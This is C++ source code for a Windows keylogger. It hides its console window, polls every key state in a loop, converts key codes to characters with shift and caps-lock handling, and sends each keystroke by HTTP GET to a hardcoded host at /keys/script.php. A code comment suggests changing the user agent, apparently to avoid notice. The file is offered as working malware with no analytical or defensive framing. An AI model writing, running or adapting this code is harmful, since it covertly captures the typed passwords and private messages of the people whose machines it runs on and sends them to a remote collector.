#include <Windows.h>
#include <WinInet.h>
#include <string>

#pragma comment (lib, "wininet.lib")

#define INTERNET_OPEN_TYPE_DIRECT 1
#define INTERNET_SERVICE_HTTP 3
#define GET 0
#define POST 1

std::string vKeys[255]{
	//0x0X
	"Control-break processing", "Left mouse button", "Right mouse button", "Undefined",
	"Middle mouse button", "X2 mouse button", "X1 mouse button", "BACKSPACE",
	"BACKSPACE", "TAB", "Reserved", "Reserved",
	"CLEAR", "ENTER", "Undefined", "Undefined",
	//0x1X
	"SHIFT", "CTRL", "ALT", "PAUSE/BREAK",
	"CAPS LOCK", "IME Kana / Hanguel / Hangul mode", "IME On", "IME Junja mode",
	"IME final mode", "IME Hanja / Kanji mode", "IME Off", "ESC",
	"IME convert", "IME nonconvert", "IME accept", "IME mode change request",
	//0x2X
	"SPACEBAR", "PAGE UP", "PAGE DOWN", "END",
	"HOME", "LEFT ARROW", "UP ARROW", "RIGHT ARROW",
	"DOWN ARROW", "SELECT", "PRINT", "EXECUTE",
	"PRINT SCREEN", "INS", "DELETE", "HELP",
	//0x3X
	"0", "1", "2", "3",
	"4", "5", "6", "7",
	"8", "9", "Undefined", "Undefined",
	"Undefined", "Undefined", "Undefined", "Undefined",
	//0x4X
	"Undefined", "A", "B", "C",
	"D", "E", "F", "G",
	"H", "I", "J", "K",
	"L", "M", "N", "O",
	//0x5X
	"P", "Q", "R", "S",
	"T", "U", "V", "W",
	"X", "Y", "Z", "Left Windows key (Natural keyboard)",
	"Right Windows key (Natural keyboard)", "Applications key (Natural keyboard)", "Reserved", "Computer Sleep key",
	//0x6X
	"Numpad 0", "Numpad 1", "Numpad 2", "Numpad 3",
	"Numpad 4", "Numpad 5 ", "Numpad 6", "Numpad 7",
	"Numpad 8", "Numpad 9", "Multiply key", "Add key",
	"Separator key", "Subtract key", "Decimal key", "Divide key",
	//0x7X
	"F1", "F2", "F3", "F4",
	"F5", "F6", "F7", "F8",
	"F9", "F10", "F11", "F12",
	"F13", "F14", "F15", "F16",
	//0x8X
	"F17", "F18", "F19", "F20",
	"F21", "F22", "F23", "F24",
	"Unassigned", "Unassigned", "Unassigned", "Unassigned",
	"Unassigned", "Unassigned", "Unassigned", "Unassigned",
	//0x9X
	"NUM LOCK", "SCROLL LOCK", "OEM specific", "OEM specific",
	"OEM specific", "OEM specific", "OEM specific", "Unassigned",
	"Unassigned", "Unassigned", "Unassigned", "Unassigned",
	"Unassigned", "Unassigned", "Unassigned", "Unassigned",
	//0xAX
	"LSHIFT", "RSHIFT", "LCONTROL", "RCONTROL",
	"LMENU", "RMENU", "Browser Back key", "Browser Forward key",
	"Browser Refresh key", "Browser Stop key", "Browser Search key", "Browser Favorites key",
	"Browser Start and Home key", "Volume Mute key", "Volume Down key", "Volume Up key",
	//0xBX
	"Next Track key", "Previous Track key", "Stop Media key", "Play/Pause Media key",
	"Start Mail key", "Select Media key", "Start Application 1 key", "Start Application 2 key",
	"Reserved", "Reserved", "VK_OEM_1 (;)", "=",
	",", "-", ".", "VK_OEM_2 (/)",
	//0xCX
	"VK_OEM_3 (`)", "Reserved", "Reserved", "Reserved",
	"Reserved", "Reserved", "Reserved", "Reserved",
	"Reserved", "Reserved", "Reserved", "Reserved",
	"Reserved", "Reserved", "Reserved", "Reserved",
	//0xDX
	"Reserved", "Reserved", "Reserved", "Reserved",
	"Reserved", "Reserved", "Reserved", "Reserved",
	"Unassigned","Unassigned","Unassigned", "VK_OEM_4 ([)",
	"VK_OEM_5 (\\)", "VK_OEM_6 (])", "VK_OEM_7 (\')", "VK_OEM_8",
	//0xEX
	"Reserved", "OEM specific", "VK_OEM_102", "OEM specific",
	"OEM specific", "IME PROCESS key", "OEM specific", "VK_PACKET",
	"Unassigned", "OEM specific", "OEM specific", "OEM specific",
	"OEM specific", "OEM specific", "OEM specific", "OEM specific",
	//0xFX
	"OEM specific", "OEM specific", "OEM specific", "OEM specific",
	"OEM specific", "OEM specific", "Attn key", "CrSel key",
	"ExSel key", "Erase EOF key", "Play key", "Zoom key",
	"Reserved", "PA1 key", "Clear key" };

std::string vKeysReversed[255]{
	//0x0X
	"Right mouse button", "Left mouse button", "Control-break processing", "Middle mouse button",
	"X1 mouse button", "X2 mouse button", "Undefined", "BACKSPACE",
	"BACKSPACE", "TAB", "Reserved", "Reserved",
	"CLEAR", "ENTER", "Undefined", "Undefined",
	//0x1X
	"SHIFT", "CTRL", "ALT", "PAUSE/BREAK",
	"CAPS LOCK", "IME Kana / Hanguel / Hangul mode", "IME On", "IME Junja mode",
	"IME final mode", "IME Hanja / Kanji mode", "IME Off", "ESC",
	"IME convert", "IME nonconvert", "IME accept", "IME mode change request",
	//0x2X
	"SPACEBAR", "PAGE UP", "PAGE DOWN", "END",
	"HOME", "LEFT ARROW", "UP ARROW", "RIGHT ARROW",
	"DOWN ARROW", "SELECT", "PRINT", "EXECUTE",
	"PRINT SCREEN", "INS", "DELETE", "HELP",
	//0x3X
	")", "!", "@", "#",
	"$", "%", "^", "&",
	"*", "(", "Undefined", "Undefined",
	"Undefined", "Undefined", "Undefined", "Undefined",
	//0x4X
	"Undefined", "a", "b", "c",
	"d", "e", "f", "g",
	"h", "i", "j", "k",
	"l", "m", "n", "o",
	//0x5X
	"p", "q", "r", "s",
	"t", "u", "v", "w",
	"x", "y", "z", "Left Windows key (Natural keyboard)",
	"Right Windows key (Natural keyboard)", "Applications key (Natural keyboard)", "Reserved", "Computer Sleep key",
	//0x6X
	"Numpad 0", "Numpad 1", "Numpad 2", "Numpad 3",
	"Numpad 4", "Numpad 5 ", "Numpad 6", "Numpad 7",
	"Numpad 8", "Numpad 9", "Multiply key", "Add key",
	"Separator key", "Subtract key", "Decimal key", "Divide key",
	//0x7X
	"F1", "F2", "F3", "F4",
	"F5", "F6", "F7", "F8",
	"F9", "F10", "F11", "F12",
	"F13", "F14", "F15", "F16",
	//0x8X
	"F17", "F18", "F19", "F20",
	"F21", "F22", "F23", "F24",
	"Unassigned", "Unassigned", "Unassigned", "Unassigned",
	"Unassigned", "Unassigned", "Unassigned", "Unassigned",
	//0x9X
	"NUM LOCK", "SCROLL LOCK", "OEM specific", "OEM specific",
	"OEM specific", "OEM specific", "OEM specific", "Unassigned",
	"Unassigned", "Unassigned", "Unassigned", "Unassigned",
	"Unassigned", "Unassigned", "Unassigned", "Unassigned",
	//0xAX
	"LSHIFT", "RSHIFT", "LCONTROL", "RCONTROL",
	"LMENU", "RMENU", "Browser Back key", "Browser Forward key",
	"Browser Refresh key", "Browser Stop key", "Browser Search key", "Browser Favorites key",
	"Browser Start and Home key", "Volume Mute key", "Volume Down key", "Volume Up key",
	//0xBX
	"Next Track key", "Previous Track key", "Stop Media key", "Play/Pause Media key",
	"Start Mail key", "Select Media key", "Start Application 1 key", "Start Application 2 key",
	"Reserved", "Reserved", "VK_OEM_1 (:)", "+",
	"<", "_", ">", "VK_OEM_2 (?)",
	//0xCX
	"VK_OEM_3 (~)", "Reserved", "Reserved", "Reserved",
	"Reserved", "Reserved", "Reserved", "Reserved",
	"Reserved", "Reserved", "Reserved", "Reserved",
	"Reserved", "Reserved", "Reserved", "Reserved",
	//0xDX
	"Reserved", "Reserved", "Reserved", "Reserved",
	"Reserved", "Reserved", "Reserved", "Reserved",
	"Unassigned","Unassigned","Unassigned", "VK_OEM_4 ({)",
	"VK_OEM_5 (|)", "VK_OEM_6 (})", "VK_OEM_7 (\")", "VK_OEM_8",
	//0xEX
	"Reserved", "OEM specific", "VK_OEM_102", "OEM specific",
	"OEM specific", "IME PROCESS key", "OEM specific", "VK_PACKET",
	"Unassigned", "OEM specific", "OEM specific", "OEM specific",
	"OEM specific", "OEM specific", "OEM specific", "OEM specific",
	//0xFX
	"OEM specific", "OEM specific", "OEM specific", "OEM specific",
	"OEM specific", "OEM specific", "Attn key", "CrSel key",
	"ExSel key", "Erase EOF key", "Play key", "Zoom key",
	"Reserved", "PA1 key", "Clear key" };

int getShiftState() {
	  int shiftPressed = GetKeyState(VK_SHIFT);
	  if (shiftPressed == -127 || shiftPressed == -128)
	  {
	  	  return 1;
	  }
	  else 
	  {
	  	  return 0;
	  }
}

int getCapsState() {
	  return GetKeyState(VK_CAPITAL);
}

void HttpRequest(std::string site, std::string param) {
	  HINTERNET hInternet = InternetOpenW(L" ", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0); //you should perhaps edit your useragent ? :p
	  std::wstring widestr;
	  for (int i = 0; i < site.length(); ++i)
	  {
		    widestr += wchar_t(site[i]);
	  }
	  const wchar_t* site_name = widestr.c_str();

	  std::wstring widestr2;
	  for (int i = 0; i < param.length(); ++i)
	  {
		    widestr2 += wchar_t(param[i]);
	  }
	  const wchar_t* site_param = widestr2.c_str();
	  HINTERNET hConnect = InternetConnectW(hInternet, site_name, 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	  const wchar_t* parrAcceptTypes[] = { L"text/*", NULL }; // accepted types. We'll choose text.

	  HINTERNET hRequest = HttpOpenRequestW(hConnect, L"GET", site_param, NULL, NULL, parrAcceptTypes, 0, 0);
	  BOOL bRequestSent = HttpSendRequestW(hRequest, NULL, 0, NULL, 0);
	  InternetCloseHandle(hRequest);
	  InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int main()
{
	  ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (1) {
        for (int i = 0; i <= 256; i++)
        {
            if ((GetAsyncKeyState(i) & 0x8001) == 0x8001)
            {
				        std::string ans;
				        if ((0x41 <= i && i <= 0x5A)) 
				        {
					          int shiftOn = getShiftState();
					          int capsOn = getCapsState();
					          if ((!capsOn && !shiftOn) || (capsOn && shiftOn)) {
				                ans = vKeysReversed[i];
					          }
					          else
				  	        {
				  		      ans = vKeys[i];
			  		    }
		  	    }
		  	    else if ((0x30 <= i && i <=0x39) || i == 0xBD || i == 0xBB || i == 0xC0 || i == 0xDB 
		  	              || i == 0xDD || i == 0xBA || i == 0xDE || i == 0xBC || i == 0xBE || i == 0xBF) 
		  	    {
		  	        int shiftOn = getShiftState();
		  			    if (shiftOn) 
		  			    {
		  			        ans = vKeysReversed[i];
		  			    }
			  		    else 
		  			    {
		  			        ans = vKeys[i];
		  			    }
		  	    }
			      else 
            {
			          ans = vKeys[i];
			      }
			      std::string IP = "10.0.2.18";
			      std::string params = "/keys/script.php?k=" + ans;
			      HttpRequest(IP, params);
                
            }
        }
    } 
}
